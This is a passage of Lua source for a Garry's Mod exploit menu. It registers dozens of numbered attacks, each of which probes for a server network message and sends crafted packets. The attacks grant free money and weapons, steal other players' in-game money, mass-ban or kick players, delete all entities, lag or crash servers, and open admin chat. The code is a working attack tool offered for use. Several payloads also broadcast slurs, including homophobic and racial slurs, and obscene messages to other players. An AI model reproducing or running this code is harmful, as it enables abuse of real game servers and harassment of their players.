	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("Taxi_Add") -- need to test

	if (status) then
	    ECPrint("Found Exploit: Free Money #21 [Taxi_Add]")

	    addExploit("154", "Free Money #21", "maybe not work", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("Taxi_Add")
	        net.WriteString("MLG")
	        net.WriteTable({-1333.647461, -1473.931763, -139.968750})
	        net.WriteFloat(-99999999)
	        net.WriteString(Desc)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("BuyCar")

	if (status) then
	    ECPrint("Found Exploit: Free Money #22 [BuyCar]")

	    addExploit("155", "Free Money #22", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start('BuyCar')
	        net.WriteFloat(-1000000)
	        net.WriteEntity(LocalPlayer())
	        net.WriteString("Gay")
	        net.WriteString("Cock")
	        net.WriteString("Twat")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("rpi_trade_end")

	if (status) then
	    ECPrint("Found Exploit: Test Function [rpi_trade_end]")

	    addExploit("156", "Test Function", "just test", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        local it = 0

	        timer.Create(util.CRC(tostring(CurTime())), 0.5, 0, function()
	            if (it > #player.GetAll()) then
	                it = 1
	            else
	                it = it + 1
	            end

	            net.Start("rpi_trade_end")
	            net.WriteUInt(it, 16)
	            net.SendToServer()
	        end)
	    end)
	end

	status = ValidNetString("ClickerForceSave")

	if (status) then
	    ECPrint("Found Exploit: Melon Crash [ClickerForceSave]")

	    addExploit("157", "Melon Crash", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        hook.Add("Think", "ps_spam", function()
	            for k, v in pairs(player.GetAll()) do
	                net.Start("ClickerForceSave")
	                net.WriteEntity(ply)
	                net.WriteInt(1, 1)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("SRequest")

	if (status) then
	    ECPrint("Found Exploit: Deagle Grab [SRequest]")

	    addExploit("158", "Deagle Grab", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("SRequest")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("HealButton")

	if (status) then
	    ECPrint("Found Exploit: Free HP [HealButton]")

	    addExploit("159", "Free HP", "free hp", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("HealButton")
	        net.WriteEntity(LocalPlayer())
	        net.WriteFloat(999999)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ArmorButton")

	if (status) then
	    ECPrint("Found Exploit: Free Armor [ArmorButton]")

	    addExploit("160", "Free Armor", "free armor", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ArmorButton")
	        net.WriteEntity(LocalPlayer())
	        net.WriteFloat(999999)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("SprintSpeedset")

	if (status) then
	    ECPrint("Found Exploit: TTT SpeedHack [SprintSpeedset]")

	    addExploit("161", "TTT SpeedHack", "changes your speed", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("SprintSpeedset")
	        net.WriteFloat(math.min(math.max(2, 0.1), 2))
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("GiveArmor100")

	if (status) then
	    ECPrint("Found Exploit: Armor Exploit [GiveArmor100]")

	    addExploit("162", "Armor Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("GiveArmor100")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("GiveSCP294Cup") -- NEED TO TEST !!

	if (status) then
	    ECPrint("Found Exploit: 294 JAM [NEED TO TEST] [GiveSCP294Cup]")
	    SCPLAG = 0

	    addExploit("163", "SCP 249 JAM!", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if (SCPLAG == 0) then
	            SCPLAG = 1

	            timer.Create("LagThatShit", time, 0.05, function()
	                for k, v in pairs(ents.GetAll()) do
	                    if v:GetClass() == "scp294" then
	                        net.Start("GiveSCP294Cup")
	                        net.WriteString("shit")
	                        net.WriteEntity(v)
	                        net.SendToServer()
	                    end
	                end
	            end)
	        else
	            SCPLAG = 0
	            timer.Remove("LagThatShit")
	        end
	    end)
	end


	status = ValidNetString("Client_To_Server_OpenEditor")

	if (status) then
	    ECPrint("Found Exploit: SCP 249 Drink Menu Hack [Client_To_Server_OpenEditor]")

	    addExploit("164", "SCP 249 Drink Menu Hack", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("Client_To_Server_OpenEditor")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DuelMessageReturn")

	if (status) then
	    ECPrint("Found Exploit: Duel Crazy [DuelMessageReturn]")

	    addExploit("165", "Duel Crazy", "forces all players to fight with all players, discovered by Solly", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("crazyduel", 0.1, 0, function()
	            s.duel[1] = table.Random(player.GetAll())
	            s.duel[2] = table.Random(player.GetAll())
	            net.Start("DuelMessageReturn")
	            net.WriteFloat(1)
	            net.WriteTable(s.duel)
	            net.SendToServer()
	        end)
	    end)
	end

	status = ValidNetString("userAcceptPrestige")

	if (status) then
	    ECPrint("Found Exploit: Free Prestige [userAcceptPrestige]")

	    addExploit("166", "Free Prestige", "exploit for free prestige", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("userAcceptPrestige")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("wordenns")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #11 [wordenns]")

	    addExploit("167", "Steal All Monies #11", "withdraw money from all printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        ECPrint("printers:" .. tostring(#ents.FindByClass("derma_printer")))

	        for k, v in pairs(ents.FindByClass("derma_printer")) do
	            net.Start("wordenns")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("guncraft_removeWorkbench")

	if (status) then
	    ECPrint("Found Exploit: Remove all Entity [guncraft_removeWorkbench]")

	    addExploit("168", "Remove all Entity", "an exploit in addon 'GunCraft'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if not timer.Exists("removentity") then
	            timer.Create("removentity", 3, 0, function()
	                for k, v in pairs(ents.GetAll()) do
	                    net.Start("guncraft_removeWorkbench")
	                    net.WriteEntity(v)
	                    net.SendToServer()
	                end
	            end)
	        end
	    end)
	end

	status = ValidNetString("BuyKey")

	if (status) then
	    ECPrint("Found Exploit: Blue Unbox Exploit [NEED TO TEST]")

	    addExploit("169", "Blue Unbox Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("BuyKey")
	        net.SendToServer()
	        net.Start("BuyCrate")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("casinokit_chipexchange")

	if (status) then
	    ECPrint("Found Exploit: Free Money #23 [casinokit_chipexchange]")

	    addExploit("170", "Free Money #23", "only works if outdated", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        local moneylog = LocalPlayer():getDarkRPVar("money")
	        net.Start("casinokit_chipexchange")
	        net.WriteEntity(self)
	        net.WriteString("darkrp")
	        net.WriteBool(true)
	        net.WriteUInt(LocalPlayer():getDarkRPVar("money"), 32)
	        net.SendToServer()

	        timer.Simple(3, function()
	            for i = 1, 5000 do
	                net.Start("casinokit_chipexchange")
	                net.WriteEntity(self)
	                net.WriteString("darkrp")
	                net.WriteBool(false)
	                net.WriteUInt(moneylog * 0.10, 32)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("PurchaseWeed")

	if (status) then
	    ECPrint("Found Exploit: Buy Weed [PurchaseWeed]")

	    addExploit("171", "Buy Weed", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("PurchaseWeed")
	        net.WriteInt(tonumber(10000), 16)
	        net.WriteInt(tonumber(1), 16)
	        net.WriteBool(LocalPlayer().Buying)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("PurchaseWeed")

	if (status) then
	    ECPrint("Found Exploit: Sell Weed [PurchaseWeed]")

	    addExploit("172", "Sell Weed", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("PurchaseWeed")
	        net.WriteInt(tonumber(100), 16)
	        net.WriteInt(tonumber(100), 16)
	        net.WriteBool(LocalPlayer().Selling)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DoDealerDeliver")

	if (status) then
	    ECPrint("Found Exploit: Buy Tab [DoDealerDeliver]")

	    addExploit("173", "Buy Tab", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if (LocalPlayer():getDarkRPVar("money") >= WEED_CONFIG.TabletPrice) then
	            net.Start("DoDealerDeliver")
	            net.WriteBool(false)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("DoDealerDeliver")

	if (status) then
	    ECPrint("Found Exploit: Buy Bong [DoDealerDeliver]")

	    addExploit("174", "Buy Bong", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if (LocalPlayer():getDarkRPVar("money") >= WEED_ITEMS.Items["Tools"]["bong"].price) then
	            net.Start("DoDealerDeliver")
	            net.WriteBool(true)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("sendDuelInfo")

	if (status) then
	    ECPrint("Found Exploit: Duel NPC Exploit [sendDuelInfo]")

	    addExploit("175", "Duel NPC Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("sendDuelInfo")
	        net.WriteString(table.Random(player.GetAll()):Nick())
	        net.WriteString("xxdddd")
	        net.WriteString("1e+100")
	        net.WriteEntity(table.random(player.GetAll()):UserID())
	        net.WriteInt(3, 3)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("InviteMember")

	if (status) then
	    ECPrint("Found Exploit: Invite all players [InviteMember]")

	    addExploit("176", "Invite all players", "Invite all players to your org", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("InviteMember")
	            net.WriteEntity(v)
	            net.WriteEntity(v)
	            net.WriteString("lol what")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("newTerritory")

	if (status) then
	    ECPrint("Found Exploit: New Territory [newTerritory]")

	    addExploit("177", "New Territory", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("newTerritory")
	            net.WriteString("Hackers")
	            net.WriteTable(t)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("CreateOrganization")

	if (status) then
	    ECPrint("Found Exploit: Org Exploit [CreateOrganization]")

	    addExploit("178", "Org Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("CreateOrganization")
	            net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	            net.WriteString("Join my gang or will rekt u")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("DisbandOrganization")

	if (status) then
	    ECPrint("Found Exploit: Org Disband [DisbandOrganization]")

	    addExploit("179", "Org Disband", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("DisbandOrganization")
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ChangeOrgName")

	if (status) then
	    ECPrint("Found Exploit: Org Change Name [ChangeOrgName]")

	    addExploit("180", "Org Change Name", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ChangeOrgName")
	        net.WriteString("I LOVE BANNAS WOOOOOOOOO I FUCKED GIANT BABIES WOOOOOO")
	        net.WriteString("SHITTY CUNT ASS SERVER FUCK OFF. STOP WITH YOUR SHITTY COPY AND PASTE SHIT! YOU STOLE MY SHIT NIGGER!")
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("IS_SubmitSID_C2S")

	if (status) then
	    ECPrint("Found Exploit: Free Reward [IS_SubmitSID_C2S | IS_GetReward_C2S]")

	    addExploit("181", "Free Reward", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("IS_SubmitSID_C2S")
	        net.WriteString("Killa")
	        net.SendToServer()
	        net.Start("IS_GetReward_C2S")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("AcceptBailOffer")

	if (status) then
	    ECPrint("Found Exploit: Bail Offer Exploit [AcceptBailOffer]")

	    addExploit("182", "Bail Offer Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("AcceptBailOffer")
	            net.WriteEntity(v)
	            net.WriteUInt(-100000000000000000, 16)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("CP_Test_Results")

	if (status) then
	    ECPrint("Found Exploit: CP Bypass [CP_Test_Results]")

	    addExploit("183", "CP Bypass", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("CP_Test_Results")
	        net.WriteInt(1, 8)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ReSpawn")

	if (status) then
	    ECPrint("Found Exploit: Respawn #4 [ReSpawn]")

	    addExploit("184", "Respawn #4", "just respawn", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ReSpawn")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("FIGHTCLUB_KickPlayer")

	if (status) then
	    ECPrint("Found Exploit: Fight Club Kick [FIGHTCLUB_KickPlayer]")

	    addExploit("185", "Fight Club Kick", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("FIGHTCLUB_KickPlayer")
	            net.WriteBit(v)
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("FIGHTCLUB_StartFight")

	if (status) then
	    ECPrint("Found Exploit: Fight Club Start Fight [FIGHTCLUB_StartFight]")

	    addExploit("186", "Fight Club Start Fight", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("FIGHTCLUB_StartFight")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("IveBeenRDMed")

	if (status) then
	    ECPrint("Found Exploit: Fake RDM [IveBeenRDMed]")

	    addExploit("187", "Fake RDM", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("IveBeenRDMed")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("nCTieUpStart")

	if (status) then
	    ECPrint("Found Exploit: Combine Control Exploit [nCTieUpStart]")

	    addExploit("188", "Combine Control Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("nCTieUpStart")
	            net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("DestroyTable")

	if (status) then
	    ECPrint("Found Exploit: Fuck All [DestroyTable]")

	    addExploit("189", "Fuck All", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("DestroyTable")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("start_wd_hack")

	if (status) then
	    ECPrint("Found Exploit: Hack Phone Exploit [start_wd_hack]")

	    addExploit("190", "Hack Phone Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("start_wd_hack")
	        net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("bringNfreeze")

	if (status) then
	    ECPrint("Found Exploit: Ban Exploit [bringNfreeze]")

	    addExploit("191", "Ban Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start('bringNfreeze')
	            net.WriteEntity(self)
	            net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("JoinFirstSS")

	if (status) then
	    ECPrint("Found Exploit: Join First SS [JoinFirstSS]")

	    addExploit("192", "Join First SS", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("JoinFirstSS")
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("unarrestPerson")

	if (status) then
	    ECPrint("Found Exploit: Unarrest Person [unarrestPerson]")

	    addExploit("193", "Unarrest Person", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("unarrestPerson")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("giveArrestReason")

	if (status) then
	    ECPrint("Found Exploit: Give Arrest Reason [giveArrestReason]")

	    addExploit("194", "Give Arrest Reason", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("giveArrestReason")
	            net.WriteEntity(LocalPlayer())
	            net.WriteEntity(v)
	            net.WriteString("Faggot")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("sellitem")

	if (status) then
	    ECPrint("Found Exploit: Free Money #24 [sellitem]")

	    addExploit("195", "Free Money #24", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("sellitem")
	        net.WriteString(self)
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("createFaction")

	if (status) then
	    ECPrint("Found Exploit: Create Faction [createFaction]")

	    addExploit("196", "Create Faction", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("createFaction")
	            net.WriteEntity(v)
	            net.WriteString("I FUCKED SO MANY BABIES TODAY WOOOOOOOOOOOOOOOOOOOOOOOO")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("inviteToOrganization")

	if (status) then
	    ECPrint("Found Exploit: Faction Invite All [inviteToOrganization]")

	    addExploit("197", "Faction Invite All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("inviteToOrganization")
	            net.WriteEntity(v)
	            net.WriteEntity(LocalPlayer())
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("GovStation_SpawnVehicle")

	if (status) then
	    ECPrint("Found Exploit: Gov Spawn [GovStation_SpawnVehicle]")

	    addExploit("198", "Gov Spawn", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("GovStation_SpawnVehicle")
	            net.WriteString("GOV_POLICE")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("GiveWeapon")

	if (status) then
	    ECPrint("Found Exploit: Give Weapons #3 [GiveWeapon]")

	    addExploit("199", "Give Weapons #3", "get weapons", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("GiveWeapon")
	        net.WriteEntity(LocalPlayer())
	        net.WriteString("m9k_davy_crockett")
	        net.WriteFloat(0)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DailyLoginClaim")

	if (status) then
	    ECPrint("Found Exploit: Daily Login Reward [DailyLoginClaim]")

	    addExploit("200", "Daily Login Reward", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("DailyLoginClaim")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DL_AskLogsList")

	if (status) then
	    ECPrint("Found Exploit: Ask Log List [DL_AskLogsList]")

	    addExploit("201", "Ask Log List", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("DL_AskLogsList")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DL_StartReport")

	if (status) then
	    ECPrint("Found Exploit: DL Report All [DL_StartReport | DL_ReportPlayer]")

	    addExploit("202", "DL Report All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("DL_StartReport")
	            net.SendToServer()
	            net.Start("DL_ReportPlayer")
	            net.WriteEntity(v)
	            net.WriteString("Hes being a gay faggot plz ban him")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("sv_saveweapons")

	if (status) then
	    ECPrint("Found Exploit: TTT Weapons Exploit [sv_saveweapons]")

	    addExploit("203", "DL Report All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("sv_saveweapons")
	        net.WriteString("weapon_ttt_rpg")
	        net.WriteString("weapon_ttt_rpg")
	        net.WriteString("eg")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("SpecDM_SendLoadout")

	if (status) then
	    ECPrint("Found Exploit: SpecDM Exploit [SpecDM_SendLoadout]")

	    addExploit("204", "SpecDM Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("SpecDM_SendLoadout")
	        net.WriteString("eg")
	        net.WriteString("weapon_ttt_defib")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("PowerRoundsForcePR")

	if (status) then
	    ECPrint("Found Exploit: Power Rounds Force [PowerRoundsForcePR]")

	    addExploit("205", "Power Rounds Force", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("PowerRoundsForcePR")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("wyozimc_playply")

	if (status) then
	    ECPrint("Found Exploit: Wyozimc Music Exploit [wyozimc_playply]")

	    addExploit("206", "Wyozimc Music Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("wyozimc_playply")
	            net.WriteEntity(v)
	            net.WriteString("https://www.youtube.com/watch?v=2fSeiKs6MYY")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("SendSteamID")

	if (status) then
	    ECPrint("Found Exploit: Send Mail's [SendSteamID]")

	    addExploit("207", "Send Mail's", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("SendSteamID")
	            net.WriteEntity(v)
	            net.WriteString("Faggot")
	            net.WriteString("Faggot")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("JB_GiveCubics")

	if (status) then
	    ECPrint("Found Exploit: Give Cubics All [JB_GiveCubics]")

	    addExploit("208", "Give Cubics All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("JB_GiveCubics")
	            net.WriteEntity(v)
	            net.WriteInt(math.floor(dwang:GetValue()), 255)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("JB_SelectWarden")

	if (status) then
	    ECPrint("Found Exploit: Select Warden All [JB_SelectWarden]")

	    addExploit("209", "Select Warden All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("JB_SelectWarden")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("RDMReason_Explain")

	if (status) then
	    ECPrint("Found Exploit: RDM Explain [RDMReason_Explain]")

	    addExploit("210", "RDM Explain", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("RDMReason_Explain")

	            net.WriteTable({
	                id = v,
	                reason = fgt
	            })

	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("redirectMsg")

	if (status) then
	    ECPrint("Found Exploit: Redirect Message [redirectMsg]")

	    addExploit("211", "Redirect Message", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("redirectMsg")
	        net.WriteString("Fuck you! YOUR ALL FAGGOTS!")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("LB_AddBan")

	if (status) then
	    ECPrint("Found Exploit: LB Ban [LB_AddBan]")

	    addExploit("212", "LB Ban", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("LB_AddBan")
	                net.WriteString("STEAM_0:0:71238382")
	                net.WriteString("fgt")
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("GET_Admin_MSGS")

	if (status) then
	    ECPrint("Found Exploit: Brass Admin Chat [GET_Admin_MSGS | OPEN_ADMIN_CHAT]")

	    addExploit("213", "Brass Admin Chat", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("GET_Admin_MSGS")
	        net.SendToServer()
	        net.Start("OPEN_ADMIN_CHAT")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("br_send_pm")

	if (status) then
	    ECPrint("Found Exploit: Brass Email Send All [br_send_pm]")

	    addExploit("214", "Brass Email Send All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("br_send_pm")
	                net.WriteString(v)
	                net.WriteString("FGT")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("LAWYER.BailFelonOut")

	if (status) then
	    ECPrint("Found Exploit: Bail Felon Out [LAWYER.BailFelonOut]")

	    addExploit("215", "Bail Felon Out", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("LAWYER.BailFelonOut")
	        net.WriteString("1")
	        net.WriteString("fgt")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("LAWYER.GetBailOut")

	if (status) then
	    ECPrint("Found Exploit: Get Bail Out [LAWYER.GetBailOut]")

	    addExploit("216", "Get Bail Out", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("LAWYER.GetBailOut")
	        net.WriteString("Mick")
	        net.WriteString("Mick")
	        net.WriteString("1000000")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("GrabMoney")

	if (status) then
	    ECPrint("Found Exploit: Get Bail Out [GrabMoney]")

	    addExploit("217", "Get Bail Out", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass() == "gold" then
	                if v:GetClass() == "silver" then
	                    if v:GetClass() == "vip" then
	                        if v:GetClass() == "vipgold" then
	                            net.Start("GrabMoney")
	                            net.WriteEntity(LocalPlayer())
	                            net.SendToServer()
	                        end
	                    end
	                end
	            end
	        end
	    end)
	end

	status = ValidNetString("nox_addpremadepunishment")

	if (status) then
	    ECPrint("Found Exploit: Nox Ban [nox_addpremadepunishment]")

	    addExploit("218", "Nox Ban", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("nox_addpremadepunishment")
	                net.WriteEntity("Sun")
	                net.WriteUInt(2, 8)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("NET_CR_TakeStoredMoney")

	if (status) then
	    ECPrint("Found Exploit: Steal Registry Money [NET_CR_TakeStoredMoney]")

	    addExploit("219", "Steal Registry Money", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass() == "ss_cash_registry" then
	                net.Start('NET_CR_TakeStoredMoney')
	                net.WriteEntity("ss_cash_registry")
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("HV_AmmoBuy")

	if (status) then
	    ECPrint("Found Exploit: HV Free Ammo [HV_AmmoBuy]")

	    addExploit("220", "HV Free Ammo", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("HV_AmmoBuy")
	        net.WriteFloat("2")
	        net.SendToServer()
	        net.Start("HV_AmmoBuy")
	        net.WriteFloat("1")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("hitcomplete")

	if (status) then
	    ECPrint("Found Exploit: Super RP Hit [hitcomplete]")

